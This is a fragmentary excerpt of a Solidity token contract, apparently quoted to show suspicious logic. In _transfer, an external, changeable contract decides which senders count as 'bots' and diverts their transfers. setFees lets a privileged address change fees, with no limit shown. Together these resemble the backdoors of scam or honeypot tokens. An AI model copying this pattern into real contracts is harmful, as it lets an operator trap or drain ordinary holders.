...
interface IFuckBot {
    function isFuckingBot(uint256 startBK, address from)
        external
        returns (bool);
}
...
abstract contract AbsToken is IERC20, Ownable, IFuckBot {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fuckBotAddress;
    ...
    function _transfer(
        ...
        if (IFuckBot(fuckBotAddress).isFuckingBot(startTradeBlock, from)) {
            _funTransfer(from, to, amount);
            return;
        }

        if (!_feeWhiteList[from] && !_feeWhiteList[to] && enableAirdrop) {
            address ad;
    ...
    function isFuckingBot(uint256 startTradeBlock, address from)
        external
        pure
        override
        returns (bool)
    ...
    function setFees(uint256 lpFee, uint256 fundFee) public {
        require(msg.sender == receiveAddress, "not dev");
        _buyLPDividendFee = lpFee;
        _sellLPDividendFee = lpFee;
        _buyFundFee = fundFee;
    ...
    function setFundAddress(address addr) public {
        require(msg.sender == fundAddress, "not fund");
        fundAddress = addr;
